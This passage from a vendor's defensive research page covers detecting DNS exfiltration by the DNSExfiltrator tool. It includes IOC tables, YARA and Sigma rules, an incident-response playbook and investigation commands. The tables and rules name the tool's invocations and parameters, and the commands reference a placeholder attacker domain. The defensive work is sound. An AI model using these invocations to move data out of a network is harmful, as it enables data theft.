- Base64-like character distribution

<span class="highlight-keyword">DGA Classification:</span>
- Is DGA: <span class="highlight-variable">TRUE</span>
- Confidence: <span class="highlight-number">96.7%</span>
- Classification: DNS_TUNNELING (not malware family)

<span class="highlight-keyword">Recommended Actions:</span>
1. Block domain via RPZ [AUTO-APPLIED]
2. Isolate host 192.168.1.50 for investigation
3. Review process list on affected host
4. Check for lateral movement from this host

<span class="highlight-keyword">MITRE ATT&CK Mapping:</span>
- T1048.003: Exfiltration Over Alternative Protocol
- T1071.004: Application Layer Protocol: DNS
- T1572: Protocol Tunneling</pre>
        </div>

        <h3>Alice AI Chatbot Integration</h3>
        <p>Natural language queries for threat investigation:</p>

        <div class="code-block">
<pre><span class="highlight-keyword">User:</span> "Is there any DNS exfiltration activity from the engineering subnet?"

<span class="highlight-keyword">Alice:</span> "Let me analyze DNS traffic from the engineering subnet (10.20.30.0/24)...

I found <span class="highlight-number">1</span> suspicious host with potential DNS exfiltration activity:

<span class="highlight-variable">Host: 10.20.30.45 (eng-workstation-12)</span>
- Sent <span class="highlight-number">2,340</span> DNS queries in the last hour
- Target domain: data-sync.suspicious-domain.net
- Subdomain entropy: <span class="highlight-number">4.18</span> (very high)
- Pattern: Sequential numbering detected
- First query: 09:15:23 UTC
- Most recent: 10:42:17 UTC

<span class="highlight-keyword">Analysis:</span> This matches the signature of DNS exfiltration tools like
DNSExfiltrator. The high entropy subdomains with sequential numbering
suggest encoded data chunks being transmitted.

<span class="highlight-keyword">Automated Response Applied:</span>
- Domain blocked via RPZ at 09:18:45 UTC
- Alert sent to SOC team
- Host flagged for investigation

Would you like me to show the actual DNS queries, or generate
an incident report?"</pre>
        </div>

        <h3>TCPWave Detection Architecture</h3>
        <div class="diagram-container">
            <pre class="ascii-diagram">
    TCPWave DNS EXFILTRATION DETECTION PIPELINE
    ============================================

                                   DNS Query
                                       |
                                       v
    +------------------------------------------------------------------+
    |                     TCPWave DNS Server                           |
    |  +------------------------------------------------------------+  |
    |  |  Layer 1: RPZ Check                                        |  |
    |  |  - Known bad domains blocked immediately                   |  |
    |  |  - Threat feed integration (Abuse.ch, PhishTank, etc.)     |  |
    |  +------------------------------------------------------------+  |
    |                              |                                   |
    |                              v                                   |
    |  +------------------------------------------------------------+  |
    |  |  Layer 2: ATLANTIS DGA Detection (ONNX Runtime)            |  |
    |  |  - Feature extraction (entropy, n-grams, etc.)             |  |
    |  |  - Binary classification: DGA or Legitimate                |  |
    |  |  - Multiclass: Identify specific malware family            |  |
    |  |  - Latency: 2-5ms                                          |  |
    |  +------------------------------------------------------------+  |
    |                              |                                   |
    |                              v                                   |
    |  +------------------------------------------------------------+  |
    |  |  Layer 3: Statistical Anomaly Detection                    |  |
    |  |  - MAD-based outlier detection                             |  |
    |  |  - Query rate analysis per client                          |  |
    |  |  - Time series pattern detection                           |  |
    |  |  - Sequential numbering pattern recognition                |  |
    |  +------------------------------------------------------------+  |
    |                              |                                   |
    |                              v                                   |
    |  +------------------------------------------------------------+  |
    |  |  Layer 4: Behavioral Correlation                           |  |
    |  |  - Cross-reference with historical data                    |  |
    |  |  - Client reputation scoring                               |  |
    |  |  - Aggregate analysis (multiple queries = pattern)         |  |
    |  +------------------------------------------------------------+  |
    +------------------------------------------------------------------+
                                   |
                +------------------+------------------+
                |                  |                  |
                v                  v                  v
          +-----------+    +------------+    +---------------+
          |   ALLOW   |    |   ALERT    |    |    BLOCK      |
          | (Normal)  |    | (Suspicious)|   | (Confirmed)   |
          +-----------+    +------------+    +---------------+
                                  |                  |
                                  v                  v
                           +------------+    +---------------+
                           | SIEM Alert |    | RPZ Update    |
                           | SOC Notify |    | Auto-Block    |
                           +------------+    +---------------+
            </pre>
        </div>
    </div>

    <!-- Section 13: Indicators of Compromise -->
    <div class="section" id="indicators">
        <h2>13. Indicators of Compromise (IOCs)</h2>

        <h3>Network-Based Indicators</h3>
        <table>
            <tr>
                <th>IOC Type</th>
                <th>Pattern</th>
                <th>Description</th>
            </tr>
            <tr>
                <td>DNS Query Pattern</td>
                <td><code>[Base64]{20+}.[0-9]+.domain.com</code></td>
                <td>Chunked data with sequence numbers</td>
            </tr>
            <tr>
                <td>Init Packet</td>
                <td><code>init.[filename].[size].[chunks].domain</code></td>
                <td>Metadata handshake pattern</td>
            </tr>
            <tr>
                <td>Query Volume</td>
                <td>>100 queries to single domain in 1 min</td>
                <td>Unusual query concentration</td>
            </tr>
            <tr>
                <td>Entropy</td>
                <td>Subdomain entropy > 3.5</td>
                <td>High randomness in subdomain</td>
            </tr>
            <tr>
                <td>DoH Traffic</td>
                <td>HTTPS to dns.google.com, cloudflare-dns.com</td>
                <td>Potential DNS bypass</td>
            </tr>
        </table>

        <h3>Host-Based Indicators</h3>
        <table>
            <tr>
                <th>IOC Type</th>
                <th>Indicator</th>
                <th>Description</th>
            </tr>
            <tr>
                <td>File Hash (Example)</td>
                <td><code>SHA256: abc123...</code></td>
                <td>DNSExfiltrator executable</td>
            </tr>
            <tr>
                <td>Process Name</td>
                <td><code>dnsExfiltrator.exe</code></td>
                <td>Default executable name</td>
            </tr>
            <tr>
                <td>PowerShell</td>
                <td><code>Invoke-DNSExfiltrator</code></td>
                <td>PowerShell cmdlet invocation</td>
            </tr>
            <tr>
                <td>JScript</td>
                <td><code>cscript.exe dnsExfiltrator.js</code></td>
                <td>JScript execution</td>
            </tr>
            <tr>
                <td>Command Line</td>
                <td><code>*.exe * * * h=google</code></td>
                <td>DoH parameter in arguments</td>
            </tr>
        </table>

        <h3>YARA Rule</h3>
        <div class="code-header">
            <span>YARA Detection Rule</span>
            <span class="tag tag-purple">Endpoint Detection</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-keyword">rule</span> DNSExfiltrator_Client {
    <span class="highlight-keyword">meta:</span>
        description = <span class="highlight-string">"Detects DNSExfiltrator client components"</span>
        author = <span class="highlight-string">"TCPWave Security Research"</span>
        date = <span class="highlight-string">"2025-12-01"</span>
        reference = <span class="highlight-string">"https://github.com/Arno0x/DNSExfiltrator"</span>

    <span class="highlight-keyword">strings:</span>
        <span class="highlight-comment">// C# strings</span>
        $s1 = <span class="highlight-string">"DNSExfiltrator"</span> ascii wide
        $s2 = <span class="highlight-string">"Invoke-DNSExfiltrator"</span> ascii wide
        $s3 = <span class="highlight-string">"dnsexfiltrator.py"</span> ascii wide

        <span class="highlight-comment">// DoH endpoints</span>
        $doh1 = <span class="highlight-string">"dns.google.com/resolve"</span> ascii wide
        $doh2 = <span class="highlight-string">"cloudflare-dns.com/dns-query"</span> ascii wide

        <span class="highlight-comment">// Parameter patterns</span>
        $param1 = <span class="highlight-string">"h=google"</span> ascii wide
        $param2 = <span class="highlight-string">"h=cloudflare"</span> ascii wide
        $param3 = <span class="highlight-string">"-b32"</span> ascii wide

        <span class="highlight-comment">// Code patterns</span>
        $code1 = <span class="highlight-string">"Base64UrlEncode"</span> ascii wide
        $code2 = <span class="highlight-string">"RC4"</span> ascii wide
        $code3 = <span class="highlight-string">"GZipStream"</span> ascii wide
        $code4 = <span class="highlight-string">"DnsQuery"</span> ascii wide

    <span class="highlight-keyword">condition:</span>
        (any of ($s*)) or
        (any of ($doh*) and any of ($param*)) or
        (3 of ($code*))
}</pre>
        </div>

        <h3>Sigma Rule</h3>
        <div class="code-header">
            <span>Sigma Detection Rule</span>
            <span class="tag tag-blue">SIEM Integration</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-keyword">title:</span> DNS Exfiltration Tool Execution
<span class="highlight-keyword">id:</span> a1b2c3d4-e5f6-7890-abcd-ef1234567890
<span class="highlight-keyword">status:</span> experimental
<span class="highlight-keyword">description:</span> Detects execution of DNS exfiltration tools like DNSExfiltrator
<span class="highlight-keyword">author:</span> TCPWave Security Research
<span class="highlight-keyword">date:</span> 2025/12/01
<span class="highlight-keyword">references:</span>
    - https://github.com/Arno0x/DNSExfiltrator
<span class="highlight-keyword">tags:</span>
    - attack.exfiltration
    - attack.t1048.003
    - attack.t1071.004
<span class="highlight-keyword">logsource:</span>
    <span class="highlight-keyword">category:</span> process_creation
    <span class="highlight-keyword">product:</span> windows
<span class="highlight-keyword">detection:</span>
    <span class="highlight-keyword">selection_exe:</span>
        Image|endswith:
            - '\dnsExfiltrator.exe'
            - '\dnsexfil.exe'
    <span class="highlight-keyword">selection_ps:</span>
        CommandLine|contains:
            - 'Invoke-DNSExfiltrator'
            - 'DNSExfiltrator.ps1'
    <span class="highlight-keyword">selection_js:</span>
        CommandLine|contains|all:
            - 'cscript'
            - 'dnsExfiltrator.js'
    <span class="highlight-keyword">selection_params:</span>
        CommandLine|contains:
            - 'h=google'
            - 'h=cloudflare'
            - '-b32'
    <span class="highlight-keyword">condition:</span> selection_exe or selection_ps or selection_js or selection_params
<span class="highlight-keyword">falsepositives:</span>
    - Legitimate penetration testing
    - Security research
<span class="highlight-keyword">level:</span> high</pre>
        </div>
    </div>

    <!-- Section 14: Incident Response -->
    <div class="section" id="response">
        <h2>14. Incident Response Playbook</h2>

        <h3>Phase 1: Detection & Triage</h3>
        <div class="timeline">
            <div class="timeline-item">
                <div class="timeline-title">1.1 Alert Validation</div>
                <p>Confirm the alert is not a false positive by reviewing DNS query patterns, entropy scores, and query volume. Cross-reference with known good baselines.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">1.2 Scope Assessment</div>
                <p>Identify all affected hosts by querying DNS logs for queries to the suspicious domain. Determine time range of activity.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">1.3 Initial Containment</div>
                <p>Add domain to RPZ blocklist immediately. Do NOT alert the attacker by shutting down the compromised host yet.</p>
            </div>
        </div>

        <h3>Phase 2: Investigation</h3>
        <div class="timeline">
            <div class="timeline-item">
                <div class="timeline-title">2.1 DNS Query Analysis</div>
                <p>Extract all DNS queries to the exfiltration domain. Decode Base64/Base32 payloads to understand what data was exfiltrated.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">2.2 Endpoint Forensics</div>
                <p>Image the affected system. Identify the exfiltration tool, execution method, and persistence mechanisms.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">2.3 Data Impact Assessment</div>
                <p>Determine what files were accessed and exfiltrated. Review file access logs, process execution history.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">2.4 Lateral Movement Check</div>
                <p>Investigate if the attacker moved to other systems. Check authentication logs, network connections from the compromised host.</p>
            </div>
        </div>

        <h3>Phase 3: Containment & Eradication</h3>
        <div class="timeline">
            <div class="timeline-item">
                <div class="timeline-title">3.1 Network Isolation</div>
                <p>Isolate compromised hosts from the network. Implement additional firewall rules to block the attacker's infrastructure.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">3.2 Malware Removal</div>
                <p>Remove the exfiltration tool and any associated malware. Check for persistence (scheduled tasks, services, registry).</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">3.3 Credential Reset</div>
                <p>Reset credentials for all accounts that may have been compromised. Assume any credentials on the affected system are compromised.</p>
            </div>
        </div>

        <h3>Phase 4: Recovery & Lessons Learned</h3>
        <div class="timeline">
            <div class="timeline-item">
                <div class="timeline-title">4.1 System Restoration</div>
                <p>Rebuild affected systems from known-good images. Apply all security patches before reconnecting to network.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">4.2 Monitoring Enhancement</div>
                <p>Implement additional detection rules based on observed TTPs. Update RPZ with IOCs from the incident.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">4.3 Post-Incident Report</div>
                <p>Document timeline, impact, root cause, and remediation actions. Identify gaps in detection and prevention.</p>
            </div>
        </div>

        <h3>Quick Reference Commands</h3>
        <div class="code-header">
            <span>Incident Response Commands</span>
            <span class="tag tag-orange">IR Toolkit</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-comment"># Extract DNS queries to suspicious domain from TCPWave logs</span>
grep <span class="highlight-string">"exfil.attacker.com"</span> /var/log/named/query.log | awk <span class="highlight-string">'{print $1, $2, $6, $7}'</span>

<span class="highlight-comment"># Decode Base64URL subdomain</span>
echo <span class="highlight-string">"SGVsbG8gV29ybGQh"</span> | base64 -d

<span class="highlight-comment"># Calculate entropy of a string (Python)</span>
python3 -c <span class="highlight-string">"import math; s='SGVsbG8gV29ybGQh'; print(-sum(s.count(c)/len(s)*math.log2(s.count(c)/len(s)) for c in set(s)))"</span>

<span class="highlight-comment"># Add domain to TCPWave RPZ via API</span>
curl -X POST https://tcpwave.local/api/rpz/block \
  -H <span class="highlight-string">"Authorization: Bearer $TOKEN"</span> \
  -d <span class="highlight-string">'{"domain": "*.exfil.attacker.com", "action": "nxdomain"}'</span>

<span class="highlight-comment"># Find processes making DNS queries on Windows</span>
Get-Process | Where-Object {$_.Modules.FileName -like <span class="highlight-string">"*dnsapi*"</span>}

<span class="highlight-comment"># Check for DNSExfiltrator on compromised Windows host</span>
Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like <span class="highlight-string">"*dnsexfil*"</span>}
Get-WinEvent -FilterHashtable @{LogName=<span class="highlight-string">'Security'</span>;Id=<span class="highlight-number">4688</span>} | Where-Object {$_.Message -like <span class="highlight-string">"*dnsexfil*"</span>}</pre>
        </div>

        <div class="alert-box alert-success">
            <div class="alert-title">Key Takeaways</div>
            <ul>
                <li><strong>Speed is critical</strong> - The faster you detect and contain, the less data is exfiltrated</li>
                <li><strong>Block at DNS level</strong> - RPZ provides immediate network-wide protection</li>
                <li><strong>Assume breach</strong> - If exfiltration occurred, assume attacker has persistent access</li>
                <li><strong>Monitor for DoH</strong> - Consider blocking or monitoring DoH endpoints</li>
                <li><strong>Layer defenses</strong> - No single detection method is sufficient; use multiple layers</li>
            </ul>
        </div>
    </div>

</div>

<div class="footer">
    <div class="footer-logo">TCPWave Security Research</div>
    <div class="footer-text">
        Enterprise DNS Security | AI-Powered Threat Intelligence | DDI Solutions<br>
        This document is for defensive security and educational purposes only.<br>
        &copy; 2025 TCPWave Inc. All Rights Reserved.
    </div>
</div>

</body>
</html>
